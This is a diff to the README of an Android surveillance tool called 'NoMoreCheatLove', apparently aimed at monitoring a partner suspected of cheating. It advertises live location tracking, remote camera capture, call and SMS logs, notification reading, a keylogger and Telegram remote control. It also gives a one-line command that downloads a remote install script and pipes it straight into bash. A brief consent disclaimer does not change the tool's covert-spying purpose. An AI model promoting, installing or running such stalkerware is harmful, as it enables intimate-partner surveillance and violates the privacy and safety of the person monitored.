@@ -1,7 +1,7 @@
 # NoMoreCheatLove 🔍  
 ### Advanced Anti-Cheat Monitoring System for Android  
 
-⚠️ **Legal Warning**: This tool must only be used with **explicit written consent**. Unauthorized monitoring violates privacy laws (GDPR, CFAA, etc).  
+⚠️ **Legal Warning**: This tool must only be used with **explicit written consent**. Unauthorized monitoring violates privacy laws (e.g., GDPR, CFAA).  
 
 ---
 
@@ -9,16 +9,14 @@
 | Feature          | Description                          |
 |------------------|--------------------------------------|
 | 📍 Live Location | Real-time GPS tracking               |
-| 📸 Remote Camera | Front/Rear camera capture           |
-| 📞 Call/SMS Logs | Monitor calls & messages            |
-| 🔔 Notifications | Read all device notifications       |
-| 🗝️ Keylogger    | Track keyboard input                |
-| 🤖 Telegram Bot  | Remote control via Telegram         |
+| 📸 Remote Camera | Front/Rear camera capture            |
+| 📞 Call/SMS Logs | Monitor calls & messages             |
+| 🔔 Notifications | Read all device notifications        |
+| 🗝️ Keylogger    | Track keyboard input                 |
+| 🤖 Telegram Bot  | Remote control via Telegram          |
 
 ---
 
-## 🚀 Installation  
-### Single-Line Install (Termux)  
 ```bash
 curl -sL https://raw.githubusercontent.com/likhonsheikhofficial/NoMoreCheatLove/main/install.sh | bash
 ```
